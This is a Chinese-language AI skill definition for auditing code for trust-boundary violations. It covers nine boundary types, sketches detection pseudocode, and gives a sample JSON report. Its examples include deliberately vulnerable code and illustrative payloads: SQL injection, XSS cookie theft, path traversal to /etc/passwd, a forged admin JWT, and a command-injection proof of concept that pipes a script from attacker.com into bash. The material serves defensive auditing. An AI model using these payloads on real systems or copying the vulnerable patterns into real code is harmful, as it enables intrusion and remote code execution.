---
name: trust-boundary-analyzer
description: 专业的审计工作流程,通过静态代码分析识别和验证信任边界穿越漏洞;重点关注检测数据从不可信上下文进入可信上下文时缺少安全验证的问题,包括前端→后端、外部服务→内部系统、缓存→业务逻辑、数据库→代码执行、用户上传→服务器处理等边界穿越场景,从而导致攻击者通过绕过边界验证实现注入、权限提升、数据篡改等安全问题;利用按编程语言组织的参考资料目录中的参考指南。
---

# 概述与边界

## 核心职责

- **聚焦**:检测数据跨越信任边界时缺少安全验证的问题
- **输入**:项目源代码 + AST解析结果
- **输出**:信任边界穿越漏洞清单 + 边界图谱 + 验证缺失点
- **价值**:发现"数据来源可信假设"导致的安全漏洞

## 什么是信任边界?

**定义**:将数据视为"可信"或"不可信"的分界线。

```
不可信区域 ───[边界]──→ 可信区域
             ↑
        需要验证的点
```

### 经典案例

```
Second-Order SQL Injection:
  用户输入 → 数据库(被视为可信) → SQL查询(未转义) → SQL注入

Config-Driven RCE:
  配置文件(被视为可信) → exec()(未验证) → 命令执行

Cache Poisoning → XSS:
  Redis缓存(被视为可信) → HTML输出(未转义) → XSS
```

---

## 9 种核心信任边界

### 边界1: 前端 → 后端

```yaml
boundary: Frontend → Backend
trust_assumption: "后端收到的数据来自前端验证,可信"
reality: "前端验证可被绕过,所有数据不可信"

vulnerable_pattern: |
  // Frontend
  <input type="number" min="1" max="100" name="quantity">

  // Backend (错误假设:前端已验证)
  app.post('/order', (req, res) => {
    const quantity = req.body.quantity; // 未验证!
    db.query(`INSERT INTO orders VALUES (${quantity})`);
  });

attack: |
  POST /order
  {"quantity": "1; DROP TABLE orders--"}

detection:
  - 检测后端接收前端参数的位置
  - 检查是否对参数进行服务端验证
  - 标注缺少验证的边界点

severity: HIGH
```

### 边界2: 外部服务 → 内部系统

```yaml
boundary: External Service → Internal System
trust_assumption: "从第三方API/合作伙伴获取的数据可信"
reality: "外部服务可能被攻破,返回恶意数据"

vulnerable_pattern: |
  // 调用第三方支付API
  const payment = await stripe.getPayment(id);

  // 直接信任返回的金额(错误!)
  db.query(`UPDATE accounts SET balance = balance - ${payment.amount}`);

attack: |
  中间人攻击修改payment.amount为负数 → 余额增加

detection:
  - 识别外部API调用点
  - 检查返回值是否经过验证
  - 检查是否有签名验证机制

severity: CRITICAL
```

### 边界3: 缓存/队列 → 业务逻辑

```yaml
boundary: Cache/Queue → Business Logic
trust_assumption: "从Redis/MQ读取的数据是系统自己写入的,可信"
reality: "缓存可能被污染,队列可能被注入恶意消息"

vulnerable_pattern: |
  // 写入缓存(未净化)
  redis.set(`user:${id}`, req.body.bio);

  // 读取缓存(视为可信,错误!)
  app.get('/profile/:id', async (req, res) => {
    const bio = await redis.get(`user:${req.params.id}`);
    res.send(`<div>${bio}</div>`); // XSS!
  });

attack: |
  POST /profile {"bio": "<script>alert(1)</script>"}
  → 存入Redis → GET /profile → XSS触发

detection:
  - 追踪数据写入缓存的路径
  - 检查写入时是否净化
  - 检查读取时是否验证/转义

severity: HIGH
```

### 边界4: 数据库 → 代码执行

```yaml
boundary: Database → Code Execution
trust_assumption: "数据库中的数据是安全的,可直接用于代码执行"
reality: "数据库可能存储了未净化的用户输入"

vulnerable_pattern: |
  // 存储用户上传的文件名
  db.insert({filename: req.body.filename}); // 未验证!

  // 后续使用(视为可信,错误!)
  const file = db.findById(id);
  fs.readFile(`./uploads/${file.filename}`, ...); // Path Traversal!

attack: |
  POST /upload {"filename": "../../etc/passwd"}
  → 后续读取 → 路径穿越

detection:
  - 识别数据库字段用于危险操作的场景
  - 检查存储时是否验证
  - 检查使用时是否二次验证

severity: HIGH
```

### 边界5: 用户上传 → 服务器处理

```yaml
boundary: User Upload → Server Processing
trust_assumption: "上传的文件类型/内容是安全的"
reality: "文件类型可伪造,内容可包含恶意代码"

vulnerable_pattern: |
  // 仅检查MIME类型(可伪造!)
  if (file.mimetype === 'image/jpeg') {
    fs.writeFile(`./public/${file.name}`, file.data);
  }

attack: |
  上传shell.php,修改Content-Type: image/jpeg
  → 绕过MIME检查 → Webshell上传

detection:
  - 识别文件上传处理逻辑
  - 检查验证强度(MIME vs Magic Bytes vs 内容扫描)
  - 检查文件存储位置(是否在Web根目录)
  - 检查文件名是否可控

severity: CRITICAL
```

### 边界6: 配置文件 → 运行时执行

```yaml
boundary: Config File → Runtime Execution
trust_assumption: "配置文件由管理员维护,内容可信"
reality: "配置可能来自用户输入,或管理员本身不可信"

vulnerable_pattern: |
  // 读取工作流配置
  const workflow = JSON.parse(fs.readFileSync(`./workflows/${id}.json`));

  // 直接执行配置中的命令(错误!)
  exec(workflow.git_command); // RCE!

attack: |
  用户创建工作流时注入恶意git_command
  → 保存到配置文件 → 执行时RCE

detection:
  - 识别配置文件的来源(静态 vs 用户可控)
  - 检查配置值用于危险操作的场景
  - 检查配置加载时是否验证

severity: CRITICAL
cve_example: "n8n Git Node RCE"
```

### 边界7: 认证前 → 认证后

```yaml
boundary: Unauthenticated → Authenticated Context
trust_assumption: "通过认证检查后,用户身份可信"
reality: "认证可能被绕过,Session可能被劫持"

vulnerable_pattern: |
  // 认证中间件
  function authMiddleware(req, res, next) {
    if (req.headers.authorization) {
      req.user = decodeToken(req.headers.authorization);
      next(); // 未验证token有效性!
    }
  }

  // 业务逻辑(假设req.user可信,错误!)
  app.get('/admin', authMiddleware, (req, res) => {
    if (req.user.role === 'admin') { // req.user可伪造!
      // 管理员操作
    }
  });

attack: |
  伪造JWT: {"role": "admin", "exp": 9999999999}
  → 绕过认证 → 访问管理员功能

detection:
  - 识别认证检查逻辑
  - 检查Session/Token验证强度
  - 检查认证后是否二次验证关键属性

severity: CRITICAL
```

### 边界8: 低权限 → 高权限

```yaml
boundary: Low Privilege → High Privilege
trust_assumption: "用户的权限级别在Session中是可信的"
reality: "权限可能在中途被篡改,需要实时验证"

vulnerable_pattern: |
  // 权限提升操作
  app.post('/promote/:userId', (req, res) => {
    const targetUser = db.findById(req.params.userId);

    // 仅检查当前用户权限(错误!)
    if (req.user.isAdmin) {
      targetUser.role = 'admin'; // 未检查目标用户是否可提升!
      targetUser.save();
    }
  });

attack: |
  管理员A提升自己为超级管理员(如果系统有多级权限)
  → 权限提升

detection:
  - 识别权限修改操作
  - 检查是否验证目标用户的可提升性
  - 检查是否有权限提升上限控制

severity: HIGH
```

### 边界9: 序列化数据 → 反序列化

```yaml
boundary: Serialized Data → Deserialization
trust_assumption: "序列化的数据来源可信"
reality: "序列化数据可能被篡改,反序列化时触发恶意代码"

vulnerable_pattern: |
  // 从Cookie反序列化(不可信来源!)
  const session = pickle.loads(req.cookies.session);

  // Java示例
  ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
  Object obj = ois.readObject(); // 危险!

attack: |
  构造恶意序列化对象 → 反序列化时执行任意代码

detection:
  - 识别反序列化操作
  - 检查数据来源(可信 vs 不可信)
  - 检查是否使用安全的序列化格式(JSON vs Pickle/Java序列化)

severity: CRITICAL
cve_examples: ["Java反序列化漏洞", "Python Pickle RCE"]
```

---

## 边界穿越检测策略

### 策略1: 边界识别

```python
def identify_trust_boundaries(ast):
    """识别代码中的信任边界点"""

    boundaries = []

    # 1. HTTP请求边界
    for node in ast.find_all("function_call", name=["req.body", "req.query", "req.params"]):
        boundaries.append({
            "type": "http_request",
            "location": node.location,
            "trust_level": "UNTRUSTED"
        })

    # 2. 数据库读取边界
    for node in ast.find_all("function_call", name=["db.find", "db.query"]):
        boundaries.append({
            "type": "database_read",
            "location": node.location,
            "trust_level": "SEMI_TRUSTED"  # 取决于写入时是否验证
        })

    # 3. 缓存读取边界
    for node in ast.find_all("function_call", name=["redis.get", "cache.get"]):
        boundaries.append({
            "type": "cache_read",
            "location": node.location,
            "trust_level": "SEMI_TRUSTED"
        })

    # 4. 外部API调用边界
    for node in ast.find_all("function_call", name=["fetch", "axios.get", "http.request"]):
        boundaries.append({
            "type": "external_api",
            "location": node.location,
            "trust_level": "UNTRUSTED"
        })

    # 5. 文件上传边界
    for node in ast.find_all("function_call", name=["multer", "upload.single"]):
        boundaries.append({
            "type": "file_upload",
            "location": node.location,
            "trust_level": "UNTRUSTED"
        })

    # 6. 配置加载边界
    for node in ast.find_all("function_call", name=["JSON.parse", "yaml.load", "require"]):
        if is_config_file(node.argument):
            boundaries.append({
                "type": "config_load",
                "location": node.location,
                "trust_level": "SEMI_TRUSTED"  # 取决于配置来源
            })

    # 7. 反序列化边界
    for node in ast.find_all("function_call", name=["pickle.loads", "ObjectInputStream.readObject"]):
        boundaries.append({
            "type": "deserialization",
            "location": node.location,
            "trust_level": "UNTRUSTED"
        })

    return boundaries
```

### 策略2: 数据流追踪

```python
def trace_cross_boundary_dataflow(boundaries, dataflow_graph):
    """追踪数据跨越边界的流向"""

    violations = []

    for boundary in boundaries:
        # 获取边界点的数据流
        flows = dataflow_graph.get_flows_from(boundary.location)

        for flow in flows:
            # 检查数据是否流向危险操作
            if flow.sink in DANGEROUS_SINKS:
                # 检查中间是否有验证节点
                has_validation = any(
                    is_validation_function(node)
                    for node in flow.path
                )

                if not has_validation:
                    violations.append({
                        "boundary": boundary,
                        "flow": flow,
                        "missing_validation": True
                    })

    return violations
```

### 策略3: 验证点检测

```python
def detect_validation_gaps(boundary, dataflow_path):
    """检测边界穿越路径上缺少的验证"""

    required_validations = {
        "http_request → sql_query": ["sql_sanitization", "parameterized_query"],
        "http_request → html_output": ["html_escape", "xss_sanitization"],
        "http_request → exec": ["whitelist_validation", "input_sanitization"],
        "database → exec": ["input_validation", "whitelist_check"],
        "cache → html": ["html_escape", "content_validation"],
        "external_api → business_logic": ["schema_validation", "signature_check"],
        "file_upload → storage": ["file_type_validation", "content_scan", "path_sanitization"],
        "config → exec": ["config_source_validation", "whitelist_check"],
        "deserialization → *": ["type_validation", "safe_deserialization"],
    }

    boundary_pattern = f"{boundary.type} → {dataflow_path.sink_type}"
    expected_validations = required_validations.get(boundary_pattern, [])

    actual_validations = [
        node.validation_type
        for node in dataflow_path.nodes
        if is_validation_node(node)
    ]

    missing = set(expected_validations) - set(actual_validations)

    return {
        "boundary_pattern": boundary_pattern,
        "required": expected_validations,
        "actual": actual_validations,
        "missing": list(missing),
        "severity": calculate_severity(boundary_pattern, missing)
    }
```

---

## 检测流程

### Step 1: 识别所有信任边界

```python
def scan_trust_boundaries(project_root):
    """扫描项目中的所有信任边界"""

    boundaries = {
        "http_boundaries": [],
        "database_boundaries": [],
        "cache_boundaries": [],
        "file_boundaries": [],
        "config_boundaries": [],
        "api_boundaries": [],
        "deserialization_boundaries": [],
    }

    for file in find_source_files(project_root):
        ast = parse_file(file)

        # 识别各类边界
        boundaries["http_boundaries"].extend(find_http_boundaries(ast))
        boundaries["database_boundaries"].extend(find_database_boundaries(ast))
        boundaries["cache_boundaries"].extend(find_cache_boundaries(ast))
        # ... 其他边界类型

    return boundaries
```

### Step 2: 分析边界穿越路径

```python
def analyze_boundary_crossings(boundaries, dataflow_results):
    """分析数据跨越边界的路径"""

    crossings = []

    for boundary_type, boundary_list in boundaries.items():
        for boundary in boundary_list:
            # 从边界点追踪数据流
            flows = dataflow_results.get_flows_from(boundary.location)

            for flow in flows:
                if flow.crosses_trust_boundary():
                    crossings.append({
                        "boundary": boundary,
                        "source": flow.source,
                        "sink": flow.sink,
                        "path": flow.path,
                        "trust_transition": f"{boundary.trust_level} → {flow.sink.trust_level}"
                    })

    return crossings
```

### Step 3: 检测验证缺失

```python
def detect_missing_validations(crossings):
    """检测缺少安全验证的边界穿越"""

    vulnerabilities = []

    for crossing in crossings:
        # 检查路径上的验证节点
        validations = [
            node for node in crossing.path
            if is_validation_node(node)
        ]

        # 检查验证是否充分
        gap = detect_validation_gaps(crossing.boundary, crossing)

        if gap["missing"]:
            vulnerabilities.append({
                "id": generate_id("tb"),
                "type": "trust_boundary_violation",
                "boundary": crossing.boundary.type,
                "source": crossing.source,
                "sink": crossing.sink,
                "missing_validations": gap["missing"],
                "severity": gap["severity"],
                "location": crossing.sink.location,
                "evidence": {
                    "path": crossing.path,
                    "existing_validations": gap["actual"],
                    "required_validations": gap["required"]
                }
            })

    return vulnerabilities
```

### Step 4: 生成边界图谱

```python
def generate_boundary_map(boundaries, crossings, vulnerabilities):
    """生成信任边界可视化图谱"""

    # 使用Graphviz生成边界图
    graph = {
        "nodes": [
            {
                "id": b.id,
                "label": b.type,
                "trust_level": b.trust_level,
                "color": get_trust_color(b.trust_level)
            }
            for b in boundaries
        ],
        "edges": [
            {
                "from": c.source.id,
                "to": c.sink.id,
                "label": "dataflow",
                "has_validation": bool(c.validations),
                "is_vulnerable": c.id in [v.id for v in vulnerabilities]
            }
            for c in crossings
        ]
    }

    return graph
```

---

## 输出格式

**输出路径**: `.workspace/tasks/{TASK_ID}/trust-boundary-analysis.json`

```json
{
  "dimension": "trust-boundary",
  "scan_time": "2025-12-16T12:00:00Z",
  "boundaries_found": 47,
  "crossings_analyzed": 123,
  "vulnerabilities_found": 8,

  "trust_boundaries": [
    {
      "id": "tb-boundary-001",
      "type": "http_request",
      "location": "src/api/user.js:23",
      "trust_level": "UNTRUSTED",
      "source": "req.body.bio",
      "description": "HTTP请求参数边界"
    },
    {
      "id": "tb-boundary-002",
      "type": "database_read",
      "location": "src/api/profile.js:45",
      "trust_level": "SEMI_TRUSTED",
      "source": "db.findById()",
      "description": "数据库读取边界"
    }
  ],

  "boundary_crossings": [
    {
      "id": "tb-crossing-001",
      "from_boundary": "tb-boundary-001",
      "to_operation": "html_output",
      "path": "req.body.bio → db.update() → db.findById() → res.send()",
      "has_validation": false,
      "risk_level": "HIGH"
    }
  ],

  "vulnerabilities": [
    {
      "id": "tb-001",
      "type": "trust_boundary_violation",
      "pattern": "Second-Order XSS",
      "severity": "HIGH",
      "confidence": "HIGH",

      "boundary": {
        "type": "database → html_output",
        "trust_assumption": "数据库数据被视为可信",
        "reality": "数据库存储了未净化的用户输入"
      },

      "dataflow": {
        "source": "req.body.bio (UNTRUSTED)",
        "path": [
          {
            "step": 1,
            "location": "src/api/user.js:34",
            "operation": "db.update({bio: req.body.bio})",
            "validation": null,
            "note": "写入数据库时未净化"
          },
          {
            "step": 2,
            "location": "src/api/profile.js:45",
            "operation": "const user = db.findById(id)",
            "trust_transition": "UNTRUSTED → SEMI_TRUSTED (错误假设!)",
            "note": "从数据库读取,被视为可信"
          },
          {
            "step": 3,
            "location": "src/api/profile.js:67",
            "operation": "res.send(`<div>${user.bio}</div>`)",
            "validation": null,
            "note": "直接输出HTML,未转义"
          }
        ],
        "sink": "html_output (DANGEROUS)"
      },

      "missing_validations": [
        {
          "location": "src/api/user.js:34",
          "required": "html_sanitization",
          "reason": "写入数据库前应净化HTML"
        },
        {
          "location": "src/api/profile.js:67",
          "required": "html_escape",
          "reason": "输出HTML时应转义"
        }
      ],

      "impact": "存储型XSS,影响所有访问该用户资料的用户",

      "poc": {
        "step1": "POST /api/user {bio: '<script>alert(document.cookie)</script>'}",
        "step2": "GET /profile/123",
        "expected_result": "XSS触发,窃取Cookie"
      },

      "fix_recommendation": [
        "写入数据库前使用DOMPurify.sanitize()净化HTML",
        "输出时使用模板引擎自动转义(如EJS的<%- %>改为<%= %>)",
        "实施CSP策略限制内联脚本执行"
      ],

      "cwe": "CWE-79 (Cross-site Scripting)",
      "owasp": "A03:2021 - Injection"
    },
    {
      "id": "tb-002",
      "type": "trust_boundary_violation",
      "pattern": "Config-Driven RCE",
      "severity": "CRITICAL",
      "confidence": "HIGH",

      "boundary": {
        "type": "config_file → command_execution",
        "trust_assumption": "配置文件内容可信",
        "reality": "配置可能来自用户输入(工作流配置)"
      },

      "dataflow": {
        "source": "workflow.json:git_branch (USER_CONTROLLABLE)",
        "path": [
          {
            "step": 1,
            "location": "src/workflow/save.js:23",
            "operation": "fs.writeFileSync(`workflows/${id}.json`, JSON.stringify(config))",
            "validation": null,
            "note": "用户配置直接保存,未验证"
          },
          {
            "step": 2,
            "location": "src/nodes/git.js:45",
            "operation": "const workflow = JSON.parse(fs.readFileSync(...))",
            "trust_transition": "USER_INPUT → TRUSTED (错误假设!)",
            "note": "加载配置文件,被视为可信"
          },
          {
            "step": 3,
            "location": "src/nodes/git.js:78",
            "operation": "exec(`git clone -b ${workflow.git_branch} ...`)",
            "validation": null,
            "note": "配置参数直接拼接命令,未验证"
          }
        ],
        "sink": "command_execution (CRITICAL)"
      },

      "missing_validations": [
        {
          "location": "src/workflow/save.js:23",
          "required": "whitelist_validation",
          "reason": "保存配置前应验证git_branch为合法分支名"
        },
        {
          "location": "src/nodes/git.js:78",
          "required": "parameterized_execution",
          "reason": "应使用execFile([..., branch])参数化执行"
        }
      ],

      "impact": "普通用户可通过工作流配置执行任意系统命令",

      "poc": {
        "config": {"git_branch": "main; curl attacker.com/shell.sh | bash;"},
        "trigger": "执行工作流",
        "expected_result": "远程下载并执行恶意脚本"
      },

      "fix_recommendation": [
        "配置保存时验证git_branch格式: /^[a-zA-Z0-9/_-]+$/",
        "使用execFile参数化执行: execFile('git', ['clone', '-b', branch, ...])",
        "实施配置白名单:仅允许预定义的分支名"
      ],

      "cve_reference": "类似 n8n CVE-2023-XXXX",
      "cwe": "CWE-78 (OS Command Injection)",
      "owasp": "A03:2021 - Injection"
    },
    {
      "id": "tb-003",
      "type": "trust_boundary_violation",
      "pattern": "Cache Poisoning → RCE",
      "severity": "HIGH",
      "confidence": "MEDIUM",

      "boundary": {
        "type": "cache → code_execution",
        "trust_assumption": "Redis缓存数据可信",
        "reality": "缓存可能被污染"
      },

      "dataflow": {
        "source": "req.query.template (UNTRUSTED)",
        "path": [
          {
            "step": 1,
            "location": "src/api/template.js:12",
            "operation": "redis.set(`tpl:${id}`, req.query.template)",
            "validation": null
          },
          {
            "step": 2,
            "location": "src/renderer/render.js:34",
            "operation": "const template = await redis.get(`tpl:${id}`)",
            "trust_transition": "UNTRUSTED → TRUSTED (错误!)"
          },
          {
            "step": 3,
            "location": "src/renderer/render.js:45",
            "operation": "eval(template)",
            "validation": null
          }
        ],
        "sink": "eval (CRITICAL)"
      },

      "missing_validations": [
        {
          "location": "src/api/template.js:12",
          "required": "template_sanitization"
        },
        {
          "location": "src/renderer/render.js:45",
          "required": "safe_template_engine",
          "reason": "不应使用eval执行模板"
        }
      ],

      "impact": "攻击者可污染缓存,在模板渲染时执行任意代码",

      "fix_recommendation": [
        "禁止用户直接控制模板内容",
        "使用安全的模板引擎(如Handlebars)替代eval",
        "对缓存数据实施完整性校验(HMAC签名)"
      ]
    }
  ],

  "boundary_map": {
    "description": "信任边界拓扑图",
    "format": "graphviz",
    "nodes": [
      {"id": "http_input", "label": "HTTP Input", "trust": "UNTRUSTED", "color": "red"},
      {"id": "database", "label": "Database", "trust": "SEMI_TRUSTED", "color": "yellow"},
      {"id": "cache", "label": "Redis Cache", "trust": "SEMI_TRUSTED", "color": "yellow"},
      {"id": "business_logic", "label": "Business Logic", "trust": "TRUSTED", "color": "green"},
      {"id": "html_output", "label": "HTML Output", "trust": "PUBLIC", "color": "orange"}
    ],
    "edges": [
      {
        "from": "http_input",
        "to": "database",
        "label": "write",
        "validated": false,
        "vulnerable": true
      },
      {
        "from": "database",
        "to": "html_output",
        "label": "read → render",
        "validated": false,
        "vulnerable": true
      }
    ]
  },

  "statistics": {
    "total_boundaries": 47,
    "by_type": {
      "http_request": 23,
      "database_read": 12,
      "cache_read": 5,
      "external_api": 4,
      "file_upload": 2,
      "config_load": 1
    },
    "crossings_analyzed": 123,
    "validated_crossings": 89,
    "unvalidated_crossings": 34,
    "vulnerabilities": {
      "critical": 1,
      "high": 2,
      "medium": 0
    }
  }
}
```

---

## 下游任务

```json
{
  "tasks": [],
  "reason": "trust-boundary-analyzer为分析维度,不生成下游任务"
}
```

---

## 与其他维度的协作

### 前置依赖

- **dataflow-analyzer**: 提供数据流图,用于追踪跨边界数据流

### 协作输出

- **combo-pattern-analyzer**: 信任边界穿越可与数据流、配置维度组合检测复杂漏洞

---

## 重要约束

1. ✅ **必须区分信任级别**: UNTRUSTED / SEMI_TRUSTED / TRUSTED
2. ⚠️ **需要数据流分析**: 依赖dataflow-analyzer的输出
3. ⚠️ **验证强度评估**: 区分"无验证" vs "弱验证" vs "强验证"
4. ⚠️ **误报控制**: 避免将合法的边界穿越误报为漏洞

---

## 参考资料

- [OWASP Trust Boundary Violation](https://owasp.org/www-community/vulnerabilities/Trust_Boundary_Violation)
- [CWE-501: Trust Boundary Violation](https://cwe.mitre.org/data/definitions/501.html)
- [Second-Order Attacks Explained](https://portswigger.net/web-security/sql-injection#second-order-sql-injection)
